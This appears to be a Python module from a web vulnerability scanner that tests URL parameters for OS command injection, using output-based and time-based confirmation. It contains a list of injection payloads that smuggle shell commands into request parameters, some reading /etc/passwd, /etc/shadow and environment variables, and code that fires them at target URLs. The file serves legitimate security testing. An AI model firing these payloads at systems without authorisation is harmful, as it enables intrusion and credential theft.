from __future__ import annotations

"""
scanner/web/cmdi.py
===================
OS Command Injection Scanner.

What is Command Injection?
--------------------------
Command injection (CWE-78) occurs when user-supplied input is passed to a
system shell without adequate sanitisation. The attacker appends shell
metacharacters to break out of the intended command context.

Example vulnerable PHP:
    $filename = $_GET['file'];
    system("cat /var/log/" . $filename);

An attacker submits: file=access.log; whoami
The server executes: cat /var/log/access.log; whoami

Detection Techniques
--------------------
1. Output-Based  — Regex-confirmed command output (``uid=``, passwd lines,
                   Windows identity markers). **Two distinct payloads** must
                   each produce output proof (no report on a single hit).
2. Time-Based    — Sleep/ping payloads; **two distinct delay payloads** must
                   each exceed median baseline by a fixed margin (two probes
                   each). Logs payload + response snippet on confirmation.

Error strings and keyword-only matches are intentionally ignored (high FP rate).

Supported Separators
--------------------
;   — Sequential execution (always runs second command)
|   — Pipe (passes output of first to second)
||  — OR operator (runs second only if first fails)
&&  — AND operator (runs second only if first succeeds)
`   — Backtick subshell (Unix)
$(  — $() subshell (Unix)
&   — Background execution (Windows CMD)

OWASP: A03:2021 - Injection  CWE-78
"""

from ..scan_logger import logger
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed

# ── Command Injection Payloads ────────────────────────────────────────────────
CMDI_PAYLOADS = [
    # ── Output-based (Unix) ────────────────────────────────────────────────────
    ";id",
    ";whoami",
    ";id;",
    ";whoami;",
    ";cat /etc/passwd",
    ";cat /etc/shadow",
    ";ls -la",
    ";ls -la /",
    ";uname -a",
    ";uname -r",
    ";hostname",
    ";ifconfig",
    ";ip addr",
    ";env",
    ";printenv",
    ";pwd",
    ";ps aux",

    # ── Output-based (Windows) ────────────────────────────────────────────────
    "&& whoami",
    "&& ipconfig",
    "&& net user",
    "&& systeminfo",
    "&& dir",
    "& whoami",
    "& ipconfig",

    # ── Pipe-based ────────────────────────────────────────────────────────────
    "| id",
    "| whoami",
    "| cat /etc/passwd",
    "| uname -a",
    "|| id",
    "|| whoami",

    # ── Subshell / backtick ───────────────────────────────────────────────────
    "$(whoami)",
    "$(id)",
    "$(cat /etc/passwd)",
    "$(uname -a)",
    "$(hostname)",
    "`whoami`",
    "`id`",
    "`cat /etc/passwd`",

    # ── Time-based blind ──────────────────────────────────────────────────────
    ";sleep 3",
    ";sleep 3;",
    "& timeout /T 3",
    "| sleep 3",
    "$(sleep 3)",
    "`sleep 3`",
    ";ping -c 3 127.0.0.1",
    "&& ping -c 3 127.0.0.1",
]

# Strong output patterns only (avoid HTML keyword false positives).
_CMDI_OUTPUT_RES: list[tuple[re.Pattern[str], str]] = [
    (re.compile(r"\buid=\d+", re.I), "Unix uid=… output"),
    (re.compile(r"\bgid=\d+", re.I), "Unix gid=… output"),
    (re.compile(r"\bgroups=\d+", re.I), "Unix groups=… output"),
    (re.compile(r"root:[x*!]:0:0:", re.I), "/etc/passwd root line"),
    (re.compile(r"\[fonts\]", re.I), "win.ini [fonts] section"),
    (re.compile(r"volume serial number is", re.I), "Windows volume serial line"),
    (re.compile(r"nt authority\\", re.I), "Windows NT AUTHORITY account string"),
    (re.compile(r"Microsoft Windows \[Version \d", re.I), "Windows version banner"),
]


from ..base_scanner import BaseScanner
from .base_module import ScanContext
from .injection_scope import is_static_asset_url
from .injection_fp_guard import suppress_cmdi_fp


class CMDiScanner(BaseScanner):
    """
    OS Command Injection vulnerability scanner.
    """

    #: Minimum seconds above median baseline for time-based confirmation
    SLEEP_DELTA = 2.5

    name = "cmdi"

    def __init__(self, urls, threads=10, timeout=10, proxy=None, **kwargs):
        super().__init__(urls, threads=threads, timeout=timeout, proxy=proxy, **kwargs)

    def run(self, context: ScanContext) -> list[dict]:
        """Standard interface for controller execution."""
        self.urls = context.urls
        self.session = context.auth_session or context.session
        return self.scan()

    def scan(self):
        """Run command injection scan across all parameterised URLs."""
        findings = []
        parameterised = [
            u for u in self.urls if "?" in u and not is_static_asset_url(u)
        ]
        if not parameterised:
            logger.warning(
                "  [!] CMDi skipped — no URLs with query parameters (%s URLs in scope)",
                len(self.urls),
            )
            return findings
        logger.info(
            "  [*] Testing %s URL(s) with %s command injection payloads",
            len(parameterised),
            len(CMDI_PAYLOADS),
        )
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futs = {ex.submit(self._test_url, u): u for u in parameterised}
            for f in as_completed(futs):
                try: findings.extend(f.result())
                except Exception: pass

        # ── Deduplicate: same path+param+type reported only once ────────────
        seen, deduped = set(), []
        for fi in findings:
            try:
                from urllib.parse import urlparse as _up
                base = _up(fi.get("url","")).path
            except Exception:
                base = fi.get("url","")
            key = (fi.get("url",""), fi.get("parameter",""), fi.get("type",""))
            if key not in seen:
                seen.add(key)
                deduped.append(fi)
        return deduped


    @staticmethod
    def _command_output_evidence(body: str) -> str | None:
        for rx, label in _CMDI_OUTPUT_RES:
            if rx.search(body):
                return label
        return None

    def _median_baseline_get(self, full_url: str) -> float | None:
        samples: list[float] = []
        for _ in range(3):
            try:
                t0 = time.perf_counter()
                self.session.get(full_url, timeout=self.timeout)
                samples.append(time.perf_counter() - t0)
            except Exception:
                continue
        if len(samples) < 2:
            return None
        samples.sort()
        return samples[len(samples) // 2]

    def _elapsed_get(self, full_url: str, timeout: float) -> float | None:
        try:
            t0 = time.perf_counter()
            self.session.get(full_url, timeout=timeout)
            return time.perf_counter() - t0
        except Exception:
            return None

    @staticmethod
    def _is_time_based_payload(payload: str) -> bool:
        pl = payload.lower()
        return any(
            x in pl
            for x in ("sleep", "timeout", "ping -c", "ping -n", "ping 127")
        )

    @staticmethod
    def _response_snippet(text: str | None, limit: int = 320) -> str:
        if not text:
            return ""
        t = text.replace("\r", " ").replace("\n", " ")
        return (t[:limit] + ("…" if len(t) > limit else "")).strip()

    def _log_cmdi_proof(
        self,
        kind: str,
        url: str,
        param: str,
        payload_summary: str,
        body: str | None,
    ) -> None:
        logger.info(
            "%s — payload + response snippet",
            kind,
            extra={
                "kind": "INJECTION_PROOF",
                "technique": kind,
                "url": url,
                "parameter": param,
                "payload": payload_summary[:800],
                "response_snippet": self._response_snippet(body),
            },
        )

    def _test_url(self, url):
        results = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        for param in params:
            base_params = {k: v[0] for k, v in params.items()}
            base_url = urlunparse(parsed._replace(query=urlencode(base_params)))

            non_time = [p for p in CMDI_PAYLOADS if not self._is_time_based_payload(p)]
            time_payloads = [p for p in CMDI_PAYLOADS if self._is_time_based_payload(p)]

            # Output-based: two distinct payloads must yield command-output proof.
            output_hits: list[tuple[str, str, str, str]] = []
            for payload in non_time:
                tp = dict(base_params)
                tp[param] = base_params[param] + payload
                test_url = urlunparse(parsed._replace(query=urlencode(tp)))
                req_to = self.timeout
                try:
                    resp = self.session.get(test_url, timeout=req_to)
                except Exception:
                    continue
                out_ev = self._command_output_evidence(resp.text)
                if not out_ev:
                    continue
                if suppress_cmdi_fp(resp.text, payload):
                    logger.info(
                        "  [i] CMDi (output) suppressed — shell escaping/sanitization indicators: %s [%s]",
                        url,
                        param,
                    )
                    continue
                output_hits.append((payload, out_ev, test_url, resp.text))
                if len({h[0] for h in output_hits}) >= 2:
                    break

            op_keys = {h[0] for h in output_hits}
            if len(op_keys) >= 2:
                h1, h2 = output_hits[0], output_hits[1]
                pl_str = f"{h1[0]} | {h2[0]}"
                self._log_cmdi_proof(
                    "CMDi (output-based)",
                    url,
                    param,
                    pl_str,
                    h2[3],
                )
                results.append({
                    "type": "OS Command Injection (Output-Based)",
                    "url": h2[2],
                    "parameter": param,
                    "payload": pl_str,
                    "severity": "CRITICAL",
                    "evidence": (
                        f"Two distinct payloads produced shell output proof "
                        f"({h1[1]}; {h2[1]}) — evaluated command output in HTTP body"
                    ),
                })
                logger.warning(
                    "  [CRITICAL] CMDi (Output) -> %s [%s]",
                    url,
                    param,
                )
                continue

            # Time-based: two distinct delay payloads must exceed baseline (no early report).
            baseline = self._median_baseline_get(base_url)
            if baseline is None:
                continue
            time_ok: dict[str, tuple[list[float], str, str]] = {}
            for payload in time_payloads:
                if payload in time_ok:
                    continue
                tp = dict(base_params)
                tp[param] = base_params[param] + payload
                test_url = urlunparse(parsed._replace(query=urlencode(tp)))
                req_to = self.timeout + 10
                try:
                    resp = self.session.get(test_url, timeout=req_to)
                except Exception:
                    continue
                if self._command_output_evidence(resp.text):
                    continue
                deltas: list[float] = []
                for _ in range(2):
                    el = self._elapsed_get(test_url, req_to)
                    if el is None:
                        break
                    deltas.append(el - baseline)
                if len(deltas) != 2 or min(deltas) < self.SLEEP_DELTA:
                    continue
                if suppress_cmdi_fp(resp.text, payload):
                    logger.info(
                        "  [i] CMDi (time) suppressed — shell escaping/sanitization indicators: %s [%s]",
                        url,
                        param,
                    )
                    continue
                time_ok[payload] = (deltas, test_url, resp.text)

            if len(time_ok) < 2:
                continue
            items = list(time_ok.items())
            (p0, (d0, u0, b0)), (p1, (d1, u1, b1)) = items[0], items[1]
            pl_str = f"{p0} | {p1}"
            self._log_cmdi_proof(
                "CMDi (time-based)",
                url,
                param,
                pl_str,
                b1,
            )
            results.append({
                "type": "OS Command Injection (Time-Based Blind)",
                "url": u1,
                "parameter": param,
                "payload": pl_str,
                "severity": "CRITICAL",
                "evidence": (
                    f"Time-based: median baseline {baseline:.2f}s; "
                    f"two distinct delay payloads exceeded baseline "
                    f"(deltas {d0[0]:.2f}s/{d0[1]:.2f}s and {d1[0]:.2f}s/{d1[1]:.2f}s; "
                    f"min >= {self.SLEEP_DELTA}s) — execution delay confirmed"
                ),
            })
            logger.warning(
                "  [CRITICAL] CMDi (Time-Blind) -> %s [%s]",
                url,
                param,
            )

        return results
